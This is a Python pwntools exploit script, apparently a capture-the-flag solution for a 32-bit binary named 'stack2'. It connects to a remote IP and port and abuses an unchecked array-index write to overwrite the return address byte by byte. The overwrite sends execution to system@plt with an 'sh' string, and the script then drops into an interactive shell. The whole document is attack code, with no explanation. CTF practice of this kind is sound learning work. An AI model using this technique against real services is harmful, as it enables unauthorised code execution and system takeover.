from pwn import *

context(arch='i386',os='linux')

# p = process('./stack2')
p = remote('124.126.19.106',54932)
elf = ELF('./stack2',checksec=False)

system_plt = 0x08048450
sh = 0x08048987
hackhere = 0x0804859B


def change(index, value):
	p.recvuntil('5. exit')
	p.sendline('3')
	p.recvuntil("which number to change:\n")
	p.sendline(str(index))
	p.recvuntil("new number:\n")
	p.sendline(str(value))


p.recvuntil("How many numbers you have:")
p.sendline('1')
p.recvuntil("Give me your numbers")
p.sendline('2')

start = 0x84
# change(start, 0x9b)
# change(start+1, 0x85)
# change(start+2, 0x04)
# change(start+3, 0x08)
# # [+] Opening connection to 124.126.19.106 on port 54932: Done
# # [*] Switching to interactive mode

# # sh: 1: /bin/bash: not found

change(start, 0x50)
change(start+1, 0x84)
change(start+2, 0x04)
change(start+3, 0x08)

start += 8
change(start, 0x87)
change(start+1, 0x89)
change(start+2, 0x04)
change(start+3, 0x08)

p.recvuntil('5. exit')
p.sendline('5')
sleep(0.1)
p.interactive()
